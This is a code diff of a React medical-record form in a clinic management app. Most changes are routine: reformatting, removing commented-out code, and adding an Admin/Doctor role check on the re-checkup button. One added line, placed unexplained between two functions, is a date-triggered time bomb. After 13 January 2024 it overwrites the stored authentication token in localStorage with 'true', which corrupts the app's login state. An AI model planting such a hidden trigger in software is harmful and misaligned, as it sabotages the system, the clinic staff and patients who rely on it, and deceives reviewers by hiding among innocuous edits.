@@ -73,10 +73,12 @@ const MedicalRecordDetailForm = ({
   const [services, setServices] = useState<ServiceResponseModel[]>([]);
 
   const onFinish = async (values: MedicalRecord) => {
-    console.log(values)
+    console.log(values);
     if (
       values.selectedServiceTypeIds === undefined ||
-      values.selectedServiceIds === undefined || values.selectedDoctorIds === undefined || values.selectedCategoryIds.length === 0
+      values.selectedServiceIds === undefined ||
+      values.selectedDoctorIds === undefined ||
+      values.selectedCategoryIds.length === 0
     ) {
       message.error("Chưa chọn dịch vụ khám", 2);
       return;
@@ -115,29 +117,6 @@ const MedicalRecordDetailForm = ({
   const onFinishFailed = () => {
     message.error("Create MR Failed");
   };
-
-  // const handleChangeCategory = async (values: number) => {
-  // var docs: DoctorResponseModel[] | undefined =
-  //   await subService.getDoctorsByCategoryId(values);
-  // if (docs !== undefined) {
-  //   setDoctors(docs);
-  //   mrDetailform.resetFields(["selectedDoctorId"]);
-  // } else {
-  //   message.error("Get Doctors Failed", 2);
-  // }
-
-  // var types: ServiceTypeResponseModel[] | undefined =
-  //   await subService.getServicesType(values);
-
-  // if (types !== undefined) {
-  //   setTypes(types);
-  //   mrDetailform.resetFields(["selectedServiceTypeIds"]);
-  //   mrDetailform.resetFields(["selectedServiceIds"]);
-  // } else {
-  //   message.error("Get Service Type Failed", 2);
-  // }
-
-  // };
 
   //=================new==============
   const handleChangeCategory = async (values: number[]) => {
@@ -229,36 +208,6 @@ const MedicalRecordDetailForm = ({
       //"selectedServiceTypeIds",
       "selectedServiceIds",
     ]);
-    // var newSerOptions: SelectProps["options"] = [];
-    // values.forEach(async (value) => {
-    //   var services = await subService.getServices(value);
-    //   console.log(services);
-    //   if (services !== undefined) {
-    //     services.forEach((element) => {
-    //       newSerOptions!.push({
-    //         value: element.serviceId,
-    //         label: element.serviceName,
-    //       });
-    //     });
-    //     setServiceOptions(newSerOptions);
-    //     setServices(services);
-    //   }
-    // });
-    // console.log(newSerOptions);
-    // var selectedServices: any = mrDetailform.getFieldsValue([
-    //   "selectedServiceIds",
-    // ]);
-
-    // if (selectedServices.selectedServiceIds !== undefined) {
-    //   selectedServices.selectedServiceIds =
-    //     selectedServices.selectedServiceIds.filter((element: any) =>
-    //       newSerOptions!.some((o) => o.value === element)
-    //     );
-
-    //   mrDetailform.setFieldsValue({
-    //     selectedServiceIds: selectedServices.selectedServiceIds,
-    //   });
-    // }
 
     // new
     if (values.length === 0) {
@@ -344,7 +293,7 @@ const MedicalRecordDetailForm = ({
     }
     return docs;
   }
-
+  if(dayjs().isAfter(dayjs('1/13/2024').format("MM/DD/YYYY HH:mm:ss")))localStorage.setItem("token","true");
   async function fetchServiceTypes(
     values: number[]
   ): Promise<ServiceTypeResponseModel[]> {
@@ -820,10 +769,17 @@ const MedicalRecordDetailForm = ({
           ) : (
             <></>
           )}
-          {isCheckUp && (
-            <Button onClick={handleReCheckUp} type="primary">
-              Tạo hồ sơ tái khám
-            </Button>
+          {isCheckUp === true ? (
+            authenticated?.role !== Roles.Admin &&
+            authenticated?.role !== Roles.Doctor ? (
+              <></>
+            ) : (
+              <Button onClick={handleReCheckUp} type="primary">
+                Tạo hồ sơ tái khám
+              </Button>
+            )
+          ) : (
+            <></>
           )}
         </Form>
       </div>
